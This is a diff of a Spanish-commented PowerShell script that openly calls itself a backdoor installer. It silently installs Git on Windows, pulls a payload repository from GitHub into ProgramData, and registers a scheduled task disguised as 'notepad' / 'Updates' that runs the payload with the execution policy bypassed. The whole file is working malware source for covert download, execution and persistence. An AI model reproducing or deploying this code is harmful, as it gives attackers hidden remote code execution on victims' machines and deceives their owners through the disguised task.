@@ -1,10 +1,21 @@
+# ================================================
 # Configuración
-$location_root = $env:ProgramData
-$folder_name = "backdoor_program" # Se creara una carpeta con este nombre
-$program_to_execute = "main.ps1" # Programa a ejecutar
-$git_origin = "https://github.com/elcaza/git_backdoor.git"
-# End Configuración
+## Cambiar los valores conforme a las necesidades, ver Anexo 0 del README.md
 
+### Ubucacion principal en que se creará el programa
+$location_root = $env:ProgramData
+
+### Carpeta para contener el programa
+$folder_name = "backdoor_program" 
+
+### Programa a ejecutar
+$program_to_execute = "main.ps1" 
+
+### Repositorio del que se descargará el archivo a ejecutar
+$git_origin = "https://github.com/elcaza/git_backdoor.git"
+
+# End Configuración
+# ================================================
 
 $is_git_ready=$false
 $program_git_location = $location_root+"\"+$folder_name
@@ -13,10 +24,11 @@ $git_client = "https://github.com/git-for-windows/git/releases/download/v2.24.0.
 
 
 # Corroboramos si git está instalado
+## Retorna true si está instalado
 function is_git_installed {
 	try {
 		git | Out-Null
-		"Git is installed"
+		"FN: Git is installed"
 		return $true
 	} catch [System.Management.Automation.CommandNotFoundException] {
 		return $false
@@ -29,33 +41,44 @@ function download_git {
 		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
 		Set-Location $using:program_git_location
 		function download_git {
-			"Descargando git..."
+			"FN: Descargando git..."
 			Invoke-WebRequest -Uri $using:git_client -OutFile ".\git.exe"
 		} download_git
 	}
 	# Creamos una tarea asincrona
 	Wait-Job $job
 	Receive-Job $job
-	"Git instalado"
+	"FN: Git Descargado"
 }
 
 # Instalamos git
 function install_git {
-	"Instalando git"
+	"FN: Instalando git"
 	Set-Location $program_git_location
 	try {
 		Start-Process "git.exe" -argumentlist "/VERYSILENT /passive /norestart" -wait
 	} catch {
-		"error"
+		"FN: error"
 	}
 }
 
+# Refresca las variables de entorno para encontrar git
+function refresh_path {
+	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
+		";" +
+		[System.Environment]::GetEnvironmentVariable("Path","User")
+}
+
+# Si tiene git instalado y puede encontrarlo descarga el repositorio del backdoor
 function download_backdoor {
 	$job = Start-Job { 
 		# Con el $using bindeamos el contexto de la función para enviar la variable program_location
-		Set-Location $using:program_location
+		"Estoy en..."
+		pwd
+		sleep -s 5
+		Set-Location $using:program_git_location
 		function download_repo {
-			"Inicializando repositorio..."
+			"FN: Inicializando repositorio..."
             git init
 			git config user.name "John Doe"
 			git config user.email "johndoe@example.com"
@@ -63,35 +86,17 @@ function download_backdoor {
 
 			
             # Descargando payload
-			"Clonado repositorio..."
+			"FN: Clonado repositorio..."
             git pull origin master
 		} download_repo	
 	}
 	# Creamos una tarea asincrona
 	Wait-Job $job
 	Receive-Job $job
-	"Backdoor descargado"
+	"FN: Backdoor descargado"
 }
 
-
-
-# function load_backdoor {
-# 	# Creamos una tarea programada
-# 	$job = Start-Job { 
-# 		function load_program {
-# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument $using:program_location + ".\" + $using:program_to_execute
-# 			$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file $using:program_location + $using:program_to_execute
-# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file "C:\script.ps1"
-
-# 			# $trigger =  New-ScheduledTaskTrigger -Daily -At 10am
-# 			$trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
-
-# 			Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "W2 Updates" -Description "Updates"
-# 		} load_program 
-# 	}
-# 	Wait-Job $job
-# }
-
+# Carga el backdoor como una tarea programada
 function load_backdoor {
 	
 	$argument_execute = "Set-Location $program_location; pwd; sleep -s 5; cat main.ps1; powershell -ExecutionPolicy Bypass .\main.ps1; sleep -s 5;"
@@ -103,66 +108,93 @@ function load_backdoor {
 	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"	
 }
 
-function refresh_path {
-	$env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") +
-		";" +
-		[System.Environment]::GetEnvironmentVariable("Path","User")
-}
-
-function start_program{
+# Inicializa el instalador
+function start_installer{
 	# Si git no está instalado
 	if( !(is_git_installed) ) {
+
+
 		"Creando ubicaciones"
 		# Creando ubicaciones
 		Set-Location $location_root
 		mkdir $folder_name
 		Set-Location $folder_name 
 
+		
 		"Descargando git"
 		# Descargamos git
 		download_git
 		"Git descargado"
+
+
 
 		"Instalando git"
 		# Instalamos git
 		install_git
 		"Git instalado"
 
+
 		$contador = 0
 		while( !($is_git_ready) ){
+			echo "intento $contador" 
 			"Probando git"
 
-			"Actualiznado variables"
+			"Actualizando variables"
 			# Actualizamos nuestra variables de entorno
 
-			# if(is_git_installed) {
-			# 	$is_git_ready=$true
-			# }
+			if(is_git_installed) {
+				$is_git_ready=$true
+				"Git ya fue encontrado"
+				""
+				git 
+				""
+				sleep -s 4
+			}
 			refresh_path
 			
 			if ( $contador -ge 10 ){
 				$is_git_ready=$true
+				"Por contador"
+				"Git ya fue encontrado"
+				""
+				git 
+				""
+				sleep -s 4
 			}
 			$contador++
-			"Git no encontrado"
+			"INSTALLER > Git no encontrado"
 			Start-Sleep -s 5
 		}
+		"Probando path"
+		refresh_path
 	}
+
+	"Probando path"
+	refresh_path
 
 	if( !(is_git_installed) ) {
+		"Git no instalado"
+		sleep -s 5
 		exit
-	}
+	} else {
+		"Git si esta instalado"
+		sleep -s 2
+		
+		#Download repo
+		"INSTALLER Descargando backdoor"
+		
+		download_backdoor
+		"INSTALLER descargado backdoor"
+		sleep -s 2
 
-	
-	
-	#Download repo
-	download_backdoor
-	
-	"Ahora deberia cargar la tarea programada"
-	# Creando tarea programada
-	load_backdoor
-	"Programa finalizado"
-	sleep -s 2
+		"ISNTALLER Ahora deberia cargar la tarea programada"
+		# Creando tarea programada
+		
+		
+		load_backdoor
+		"ISNTALLER Programa finalizado"
+		sleep -s 2
+	}
 }
 
-start_program
+start_installer
